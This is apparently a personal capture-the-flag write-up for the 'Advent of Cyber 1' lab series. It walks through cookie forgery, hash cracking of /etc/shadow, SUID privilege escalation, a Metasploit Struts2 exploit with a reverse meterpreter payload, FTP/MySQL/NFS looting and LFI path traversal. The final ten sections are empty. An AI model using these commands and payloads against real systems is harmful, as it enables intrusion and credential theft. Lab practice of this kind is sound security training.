# Advent of Cyber 1 - Easy

1. [Inventory Management](#inventory-management)
2. [Arctic Forum](#arctic-forum)
3. [Evil Elf](#evil-elf)
4. [Training](#training)
5. [Ho-Ho-Hosint](#ho-ho-hosint)
6. [Data Elf-iltration](#data-elf-iltration)
7. [Skilling Up](#skilling-up)
8. [SUID Shenanigans](#suid-shenanigans)
9. [Requests](#requests)
10. [Metasploit-a-ho-ho-ho](#metasploit-a-ho-ho-ho)
11. [Elf Applications](#elf-applications)
12. [Elfcryption](#elfcryption)
13. [Accumulate](#accumulate)
14. [Unknown Storage](#unknown-storage)
15. [LFI](#lfi)
16. [File Confusion](#file-confusion)
17. [Hydra-ha-ha-haa](#hydra-ha-ha-haa)
18. [ELF JS](#elf-js)
19. [Commands](#commands)
20. [Cronjob Privilege Escalation](#cronjob-privilege-escalation)
21. [Reverse Elf-ineering](#reverse-elf-ineering)
22. [If Santa, Then Christmas](#if-santa-then-christmas)
23. [LapLANd (SQL Injection)](#lapland-sql-injection)
24. [Elf Stalk](#elf-stalk)

## Inventory Management

```markdown
This involves the usage of Developer tools and cookies.

First, we have to go to the page and register by creating a new account.

Then, after logging in using the same credentials, we get login access.

Using developer tools, we can view the cookie name 'authid'.

The cookie value can be decoded from Base64 to give us 'v4er9ll1!ss7' as the fixed part of the cookie.

Using this, we infer that the cookie value for authentication is the username appended by the fixed part, converted to Base64.

So we get mcinventory's login access; the item ordered was 'firewall'.
```

## Arctic Forum

```markdown
This challenge involves finding hidden directories and web enumeration.

Firstly, we have to use ffuf to find hidden directories. The /sysadmin directory, in this case, is the required one.

With the help of the comments in the page source, we get to know that the credentials are 'admin:defaultpass'.

Therefore, after logging in, we get the final flag 'eggnog'.
```

## Evil Elf

```markdown
Given, we have a PCAP file which can be opened in Wireshark for analysis.

For the first flag, we have to find the destination IP of packet number 998, which can be found from the PCAP file itself.

For the second flag, we have to view the items on the Christmas list.

As we know that Telnet protocol allows us to view plaintext info, we can select that in the PCAP file.

This shows us the item 'ps4'.

Now, in order to find the hashed password, we need to view Telnet packets again; one of the packets contain the hashed passwords from /etc/shadow.

We can use Hashcat to crack password
```

```shell
#as the hash starts with $6$, it could be mostly sha512crypt
#using hashcat, we can crack the password
hashcat -m 1800 -a 0 hashedpwd.txt /usr/share/wordlists/rockyou.txt
#rainbow
```

## Training

```shell
#according to given instructions, we log into using ssh
ssh mcsysadmin@10.10.192.189

ls
#shows 8 files

#to view file5
cat file5

#to search string in files
grep "password" file*
#shows file6 with password

#to find ip address in file
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' file*
#shows file2 with ip 10.0.0.05

#to find users who can log into machine
cat /etc/passwd
#this shows list of users with shell location, /nologin means they cannot login

#get sha1 hash of file8
sha1sum file8

#to view mcsysadmin password hash
cat /etc/shadow
#this shows permission denied, so we will try to search for any copies

find / -name shadow*
#this gives us a backup file in /var directory

cat /var/shadow.bak
#gives us the required password hash
```

## Ho-Ho-Hosint

```markdown
Given, we have an image file of the Grinch. We have to use OSINT to find the answers.

Using exiftool, we get the creator of the image, jlolax1.

Upon searching the name on Google, we get their Twitter account.

We get the DOB - December 29, 1900.

Her Twitter account shows that she's a Santa's helper.

One tweet of hers state that she makes IPhone X.

The Twitter account leads to a Wordpress page as well.

To find the date when Lola first started photography, we use the Internet Archive, and find out that the website was first saved on 23/10/2019.

Visiting that link shows that it was celebrating its 5-year anniversary, hence the required answer is 23/10/2014.

Finally, the woman on her blog is Ada Lovelace, and it was found using reverse image search.
```

## Data Elf-iltration

```markdown
This challenge is based on data exfiltration techniques. We are given a PCAP file.

By using the DNS filter, we can see that there is some activity related to the domain holidaythief.com

We also see that there is a hex data transferred using DNS; upon converting that to ascii, we get the string 'Candy Cane Serial Number 8491', which gives us our first answer.

Using the HTTP protocol to confirm this, we observe that files are being downloaded.

We can view those files in Wireshark by going to File > Export Objects > HTTP > filename

This way, we have two files to inspect - a zip file and an image file.

The image file can be checked for data using 'steghide extract -sf filename'; this gives us a poem for RFC527, our third answer.

Similarly, the zip file can be cracked using zip2john and JtR to give a few text files.

The file containing Timmy's wish gives us the second answer, pentester.
```

## Skilling Up

```markdown
Here, we are required to scan a machine in our network and use tools such as nmap.
```

```shell
#nmap scan
nmap -T4 -p- -A 10.10.4.127

#nmap tcp scan 
sudo nmap -sT -p- -O -sV -T3 10.10.4.127
```

```markdown
After scanning initially, we get the following results:

    Number of open TCP ports under 1000: 3

    Host OS: Linux

    SSH version: 7.4

    Name of file found on server: interesting.file
```

## SUID Shenanigans

```shell
#nmap scan
nmap -T4 -p- -A 10.10.132.91
#gives ssh port

#ssh login using given creds
ssh holly@10.10.132.91 -p 65534

whoami
#logged in as holly, low privileged user

cd /home/igor
#flag1.txt is there, but we cannot read it

find flag1.txt -exec whoami \;
#shows that find is executed by igor
#we can try gtfobins for suid related binaries

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
#gives suid files
#lists a binary called system-control

/usr/bin/system-control
#this executes commands as root
#cat /home/igor/flag1.txt - prints flag1
#so, we can launch a shell as root here and get flag2
#/bin/bash
```

## Requests

```markdown
Given, we have 10.10.169.100 at port 3000

We have to use Python for scripting with the help of Requests library

This gives us the flag 'sCrIPtKiDd'
```

```python
import requests

host = 'http://10.10.169.100:3000'

while (host is not ''):
    response = requests.get(host)
    print("\n\nResponse")
    print(response)
    status_code = response.status_code
    print("\n\nStatus Code")
    print(status_code)
    json_response = response.json()
    print("\n\nJson response")
    print(json_response)
    converted_response = json_response.encode('ascii')
    print("\n\nConverted response")
    print(converted_response)
    text = response.text
    print("\n\nText")
    print(text)
    host = ''
```

## Metasploit-a-ho-ho-ho

```shell
#given, we have a vulnerable system
#using Metasploit, we have to gain access
msfconsole

search struts2

use exploit/multi/http/struts2_content_type_ognl

show options

set RHOSTS 10.10.7.166

set LHOST 10.17.48.136

show options

set PAYLOAD linux/x86/meterpreter/reverse_tcp

set RPORT 80

set TARGETURI /showcase.action

run
#this gives us access

pwd

#flag1 can be found in webapps directory

cd webapps/ROOT

ls

cat ThisIsFlag1.txt
#gives flag1

cd /

cd home/santa

ls

cat ssh-creds.txt
#gives ssh creds

ssh santa@10.10.7.166
#santa access

ls -la

nl naughty-list.txt
#prints file content with line numbered

nl nice-list.txt
```

## Elf Applications

```shell
#this involves exploiting application layer services
nmap -T4 -p- -A 10.10.7.146

ftp 10.10.7.146
#using anonymous login
#contains some files
#includes credentials for mysql
mget * #get all files to local system

quit #quit ftp

#connect to mysql using given creds
mysql -h 10.10.7.146 -u root -p
#prompts for password, enter given cred

help

show databases;
#show all databases

use data;
#use data table

show tables;

select * from USERS;
#show content of table
#shows password

quit

#now we have to use nfs
showmount -e 10.10.7.146

sudo mount -t nfs 10.10.7.146:/ /mnt -o nolock

cd /mnt

ls
#gives required creds files
```

## Elfcryption

```shell
#this challenge is about encryption
#we are given a zip file
unzip tosend.zip

#gives three files
#we can read the gpg file using the passphrase '25daysofchristmas' given in the hint
gpg -d note1.txt.gpg
#Santa's Grotto

#similarly, we can decrypt note2 using private.key given to us
#and passphrase is 'hello' as given in hint
openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2_plaintext.txt

cat note2_plaintext.txt
#gives flag
```

## Accumulate

```shell
#we are given a vulnerable box, we have to get flag
nmap -T4 -p- -A 10.10.71.247
#shows that website uses microsoft iis

ffuf -u 'http://10.10.71.247/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s
#gives hidden directory /retro
#website by wade

ffuf -u 'http://10.10.71.247/retro/FUZZ' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s
#gives /wp-content, /wp-includes, /wp-admin

#furthermore, one of the blog comments include the word 'parzival'
#we can try the creds wade:parzival to login to system using rdp

#install freerdp
sudo apt install freerdp2-x11 freerdp2-shadow-x11

#use freerdp to connect remotely
xfreerdp /u:wade /p:parzival /v:10.10.71.247

#this gives us access to desktop
#user.txt - THM{HACK_PLAYER_ONE}

#the desktop contains a file called hhupd
#searching hhupd gives us some CVE websites and a demonstration of exploit
#CVE-2019-1388
#once we get root access, flag can be viewed in Desktop through cmd
#root.txt - THM{COIN_OPERATED_EXPLOITATION}
```

## Unknown Storage

```markdown
This challenge is about insecure cloud storage.

We are given a bucket name 'advent-bucket-one'; we have to find more information about it.

Now, we know that the format of the URL for S3 bucket is bucketname.s3.amazonaws.com; these can be accessed through regions as well, using bucketname.region-name.amazonaws.com

On accessing the link advent-bucket-one.s3.amazonaws.com, we get the XML structure for a file named employee_names.txt

We can download the objects from S3 buckets by using AWS CLI

To check contents of bucket - aws s3 ls s3://bucket-name

To download files - aws s3 cp s3://bucket-name/file-name local-location

We do not need to use the AWS CLI here; we can simply go to /employee_names.txt and we get our flag 'mcchef'.
```

## LFI

```markdown
We have to use Local File Inclusion to get the flag.

On accessing the website, we get to know from Charlie's notes that he is going to book holiday to Hawaii.

From the source code of the website, we know that /get-file/ is used to access file here, so we can use that for LFI.

We also know that the forward slash will have to be decoded as %2F

So we attempt to enter %2Fetc%2Fshadow, and each time we do not get access, we add prefix ..%2F to move a directory up.

Eventually, ..%2F..%2F..%2Fetc%2Fshadow gives us access to /etc/shadow, where we get Charlie's hash.

It can be cracked using Hashcat, and the password is 'password1'.

We can use ssh to login into charlie's account using the above password, and we get the flag.
```

## File Confusion

```shell
```

## Hydra-ha-ha-haa

```shell
```

## ELF JS

```shell
```

## Commands

```shell
```

## Cronjob Privilege Escalation

```shell
```

## Reverse Elf-ineering

```shell
```

## If Santa, Then Christmas

```shell
```

## LapLANd (SQL Injection)

```shell
```

## Elf Stalk

```shell
```
